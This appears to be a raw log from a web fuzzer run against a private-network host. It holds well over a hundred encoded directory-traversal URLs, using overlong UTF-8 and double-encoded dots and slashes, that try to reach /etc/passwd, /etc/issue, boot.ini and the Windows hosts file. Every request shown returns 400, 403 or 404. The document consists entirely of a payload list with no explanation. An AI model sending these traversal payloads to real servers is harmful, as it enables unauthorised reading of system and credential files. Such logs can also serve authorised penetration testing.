2670,404,9L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
2671,404,9L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2fboot.ini
2679,404,9L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%2fboot.ini
2673,404,9L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2fetc%c0%2fpasswd
2677,404,9L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2fetc%c0%2fpasswd
2678,404,9L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
2676,404,9L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2fetc%c0%2fissue
2675,404,9L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2fboot.ini
2682,404,9L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
2681,404,9L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%2fetc%c0%2fpasswd
2674,404,9L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
2672,404,9L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2f%25c0%25ae%25c0%25ae%c0%2fetc%c0%2fissue
2684,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cetc%c0%5cissue
2680,404,9L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%2fetc%c0%2fissue
2685,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cetc%c0%5cpasswd
2688,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cetc%c0%5cissue
2686,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
2691,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cboot.ini
2689,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cetc%c0%5cpasswd
2683,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cboot.ini
2692,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cetc%c0%5cissue
2693,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cetc%c0%5cpasswd
2690,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
2694,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
2698,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
2699,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cboot.ini
2687,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cboot.ini
2696,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cetc%c0%5cissue
2700,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cetc%c0%5cissue
2701,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cetc%c0%5cpasswd
2702,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
2695,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cboot.ini
2704,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5cetc%c0%5cissue
2707,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vboot.ini
2697,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5c%25c0%25ae%25c0%25ae%c0%5cetc%c0%5cpasswd
2703,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5cboot.ini
2710,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
2708,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vetc%c0%9vissue
2714,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
2705,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5cetc%c0%5cpasswd
2706,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
2715,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vboot.ini
2711,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vboot.ini
2716,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vetc%c0%9vissue
2718,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
2717,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vetc%c0%9vpasswd
2709,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vetc%c0%9vpasswd
2721,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vetc%c0%9vpasswd
2722,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
2723,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vboot.ini
2712,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vetc%c0%9vissue
2713,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vetc%c0%9vpasswd
2719,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vboot.ini
2724,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vetc%c0%9vissue
2720,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vetc%c0%9vissue
2731,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afboot.ini
2733,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afetc%c0%afpasswd
2729,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9vetc%c0%9vpasswd
2732,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afetc%c0%afissue
2728,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9vetc%c0%9vissue
2725,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vetc%c0%9vpasswd
2726,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9v%25c0%25ae%25c0%25ae%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
2730,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
2727,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%9vboot.ini
2735,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afboot.ini
2739,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afboot.ini
2737,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afetc%c0%afpasswd
2736,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afetc%c0%afissue
2741,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afetc%c0%afpasswd
2742,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
2740,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afetc%c0%afissue
2743,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afboot.ini
2750,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
2734,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
2738,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
2748,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afetc%c0%afissue
2746,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
2745,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afetc%c0%afpasswd
2756,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfetc%c0%qfissue
2754,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
2755,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfboot.ini
2744,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afetc%c0%afissue
2753,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%afetc%c0%afpasswd
2752,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%afetc%c0%afissue
2749,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afetc%c0%afpasswd
2751,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%afboot.ini
2759,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfboot.ini
2758,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
2757,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfetc%c0%qfpasswd
2760,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfetc%c0%qfissue
2747,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%af%25c0%25ae%25c0%25ae%c0%afboot.ini
2763,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfboot.ini
2764,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfetc%c0%qfissue
2762,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
2766,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
2765,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfetc%c0%qfpasswd
2768,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfetc%c0%qfissue
2769,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfetc%c0%qfpasswd
2772,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfetc%c0%qfissue
2777,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qfetc%c0%qfpasswd
2761,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfetc%c0%qfpasswd
2776,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qfetc%c0%qfissue
2773,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfetc%c0%qfpasswd
2771,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfboot.ini
2775,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qfboot.ini
2774,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
2770,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
2767,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qf%25c0%25ae%25c0%25ae%c0%qfboot.ini
2785,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cetc%c1%1cpasswd
2778,400,10L,35W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
2781,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cetc%c1%1cpasswd
2784,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cetc%c1%1cissue
2786,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts
2783,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cboot.ini
2787,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cboot.ini
2779,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cboot.ini
2780,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cetc%c1%1cissue
2782,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts
2791,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cboot.ini
2797,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cetc%c1%1cpasswd
2796,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cetc%c1%1cissue
2789,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cetc%c1%1cpasswd
2795,403,11L,32W,http://192.168.0.14/%25c0%25ae%25c0%25ae%c1%1c%25c0%25ae%25c0%25ae%c1%1cboot.ini
